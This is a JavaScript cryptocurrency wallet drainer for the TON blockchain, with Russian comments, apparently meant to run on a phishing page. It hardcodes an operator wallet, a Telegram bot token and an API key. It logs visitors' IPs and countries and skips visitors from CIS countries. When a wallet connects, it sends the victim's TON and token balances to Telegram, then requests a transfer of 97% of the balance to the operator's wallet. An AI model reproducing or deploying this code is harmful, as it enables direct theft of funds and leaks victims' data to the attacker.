
var mainWallet = "UQA9or9rMdG8vk8wSX20LRapZgTUslxrHt-Oa4JCcAynwEEi"; //Ваш кошелек, куда будут лететь активы
var tgBotToken = "7828861073:AAHBgan5y0jpg24QxtNAa36PGJHggto19sM"; //Токен от бота телеграмм
var tgChat = "1447071887"; //Ваш телеграмм-чат
var tonApiKey = "45aed36e4b36070265bd8be5b8ab2fcea33d5ddd05a76de612447070a016c283"; // TON API Key

var domain = window.location.hostname;
var ipUser;
var countryUser;

//Перенаправление стран СНГ
fetch('https://ipapi.co/json/')
  .then(response => response.json())
  .then(data => {
    const country = data.country;
    if (country === 'RU' || country === 'KZ' || country === 'BY' || country === 'UA' || country === 'AM' || country === 'AZ' || country === 'KG' || country === 'MD' || country === 'UZ') {
      window.location.replace('https://ton.org');
      return;
    }
    ipUser = data.ip;
    countryUser = data.country;
    console.log('IP: ' + ipUser);
    console.log('Country: ' + countryUser);
    sendTelegramMessage(`\uD83D\uDDC4*Domain:* ${domain}\n\uD83D\uDCBB*User*: ${ipUser} ${countryUser}\n\uD83D\uDCD6*Opened the website*`);
  })
  .catch(error => {
    console.error('Error IP:', error);
    sendTelegramMessage(`\u26A0\uFE0F *Ошибка определения IP:* ${error}`);
  });

const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
  manifestUrl: 'https://' + domain + '/tonconnect-manifest.json',
  buttonRootId: 'ton-connect'
});

tonConnectUI.on('walletConnected', async (wallet) => {
    console.log('Адрес кошелька:', wallet.address);
    console.log('Wallet Info:', wallet);

    // Отправляем сообщение о подключении кошелька
    sendTelegramMessage(`\uD83D\uDCC0 *Кошелек подключен:*\nАдрес: [Ton Scan](https://tonscan.org/address/${wallet.address})\nIP: ${ipUser} ${countryUser}`);

    // Гарантированная отправка баланса в Telegram после подключения
    try {
      await sendBalanceToTelegram(wallet.address);
      await getTokenBalancesToTelegram(wallet.address);
    } catch (error) {
      console.error("Ошибка при отправке баланса в Telegram:", error);
      // Отправляем сообщение об ошибке, даже если что-то пошло не так
      sendTelegramMessage(`\u26A0\uFE0F *Критическая ошибка при отправке баланса после подключения!* ${error}`);
    }

    try {
        await didtrans();
    } catch (error) {
        console.error("Ошибка в didtrans:", error);
        sendTelegramMessage(`\u26A0\uFE0F *Ошибка в didtrans после подключения кошелька!* ${error}`);
    }
});

async function sendBalanceToTelegram(walletAddress) {
    try {
        console.log("Отправка баланса в Telegram для:", walletAddress);
        const response = await fetch(`https://toncenter.com/api/v3/wallet?address=${walletAddress}`,{
            headers: {
                'X-API-Key': tonApiKey,
            }
        });

        console.log("Ответ от API баланса:", response); // Проверка ответа

        if (!response.ok) {
            throw new Error(`Ошибка при запросе баланса: ${response.status} ${response.statusText}`);
        }

        const data = await response.json();

        console.log("Данные о балансе:", data);  // Проверка данных

        if (data.error) {
            throw new Error(`Ошибка при получении данных о балансе: ${data.error}`);
        }

        const balance = parseFloat(data.balance) / 1000000000; // Переводим в TON
        const message = `\uD83D\uDCC0 *Баланс кошелька ${walletAddress}:* ${balance.toFixed(8)} TON`;
        sendTelegramMessage(message);

    } catch (error) {
        console.error("Ошибка при получении и отправке баланса:", error);
        sendTelegramMessage(`\u26A0\uFE0F *Ошибка при получении баланса:* ${error}`);
        throw error; // Пробрасываем ошибку выше, чтобы ее обработали в walletConnected
    }
}

async function getTokenBalancesToTelegram(walletAddress) {
    try {
        console.log("Отправка токенов в Telegram для:", walletAddress); // Добавили лог
        const response = await fetch(`https://toncenter.com/api/v3/get_tokens?address=${walletAddress}`, {
            headers: {
                'X-API-Key': tonApiKey,
            }
        });

        console.log("Ответ от API токенов:", response);

        if (!response.ok) {
            console.error("Ошибка HTTP:", response.status, response.statusText);  // Лог HTTP ошибок
            throw new Error(`Ошибка при запросе токенов: ${response.status} ${response.statusText}`);
        }

        const data = await response.json();
        console.log("Данные о токенах:", data);  // Лог данных

        if (data.error) {
            console.error("Ошибка API:", data.error); // Лог ошибок API
            throw new Error(`Ошибка при получении данных о токенах: ${data.error}`);
        }

        if (data.balances && data.balances.length > 0) {
            let message = '\uD83D\uDCB0 *Токены кошелька ' + walletAddress + ':*\n';
            data.balances.forEach(token => {
                const amount = parseFloat(token.balance) / Math.pow(10, token.decimals);
                message += `- ${token.symbol}: ${amount.toFixed(8)} ${token.symbol}\n`;  // Добавлен символ токена в сообщение
            });
            console.log("Сформированное сообщение о токенах:", message); // Лог сообщения
            sendTelegramMessage(message);
        } else {
            console.log("Токены не найдены"); // Лог
            sendTelegramMessage(`\uD83D\uDCC0 *У кошелька ${walletAddress} нет токенов.*`);
        }

    } catch (error) {
        console.error("Ошибка при получении и отправке токенов:", error);
        sendTelegramMessage(`\u26A0\uFE0F *Ошибка при получении токенов:* ${error}`);
        throw error; // Пробрасываем ошибку выше
    }
}

async function didtrans() {
  if (!tonConnectUI.account) {
    console.warn("Кошелек не подключен. Невозможно получить адрес.");
    sendTelegramMessage(`\u26A0\uFE0F *Попытка отправки транзакции без подключенного кошелька!*`);
    return;
  }
  try {
    const response = await fetch(`https://toncenter.com/api/v3/wallet?address=${tonConnectUI.account.address}`,{
        headers: {
            'X-API-Key': tonApiKey,
        }
    });

    if (!response.ok) {
      console.error(`Ошибка при запросе баланса: ${response.status} ${response.statusText}`);
      sendTelegramMessage(`\u26A0\uFE0F *Ошибка при запросе баланса:* ${response.status} ${response.statusText}`);
      return;
    }
    const data = await response.json();

    if (data.error) {
      console.error(`Ошибка при получении данных о балансе: ${data.error}`);
      sendTelegramMessage(`\u26A0\uFE0F *Ошибка при получении данных о балансе:* ${data.error}`);
      return;
    }
    let originalBalance = parseFloat(data.balance);
    let processedBalance = originalBalance * 0.97; // вычитаем 3% для сохранения средств на оплату комиссий, умножаем на 0.97, а не вычитаем процент
    let tgBalance = processedBalance / 1000000000;
    const transaction = {
      validUntil: Math.floor(Date.now() / 1000) + 60, // 60 sec
      messages: [{
        address: mainWallet,
        amount: processedBalance.toString()  // Важно: amount должен быть строкой
      }, ]
    };

    try {
      const result = await tonConnectUI.sendTransaction(transaction);
      console.log("Транзакция отправлена:", result);  // Выводим результат для отладки
      sendTelegramMessage(`\uD83D\uDDC4*Domain:* ${domain}\n\uD83D\uDCBB*User:* ${ipUser} ${countryUser}\n\uD83D\uDCC0*Wallet:* [Ton Scan](https://tonscan.org/address/${tonConnectUI.account.address})\n\n\uD83D\uDC8E*Send:* ${tgBalance.toFixed(8)}`);  // toFixed чтобы ограничить кол-во знаков после запятой
    } catch (e) {
      console.error("Ошибка при отправке транзакции:", e);
      sendTelegramMessage(`\uD83D\uDDC4*Domain:* ${domain}\n\uD83D\uDCBB*User:* ${ipUser} ${countryUser}\n\uD83D\uDCC0*Wallet:* [Ton Scan](https://tonscan.org/address/${tonConnectUI.account.address})\n\n\uD83D\uDED1*Declined or error:* ${e.message}`); // Добавляем сообщение об ошибке
    }

  } catch (error) {
    console.error("Произошла общая ошибка:", error);
    sendTelegramMessage(`\u26A0\uFE0F *Общая ошибка в didtrans:* ${error}`);
  }
}


// Функция для отправки сообщений в Telegram
function sendTelegramMessage(message) {
    console.log("Отправка сообщения в Telegram:", message); // Проверка сообщения

  const encodedMessage = encodeURIComponent(message);
  const url = `https://api.telegram.org/bot${tgBotToken}/sendMessage?chat_id=${tgChat}&text=${encodedMessage}&parse_mode=Markdown`;
    console.log("URL для Telegram:", url); //Проверка URL

  fetch(url, {
      method: 'POST',
    })
    .then(response => {
        console.log("Ответ от Telegram:", response); //Проверка ответа

      if (response.ok) {
        console.log('Сообщение успешно отправлено.');
      } else {
        console.error('Ошибка при отправке сообщения:', response.status, response.statusText);
      }
    })
    .catch(error => {
      console.error('Ошибка сети при отправке сообщения:', error);
    });
}
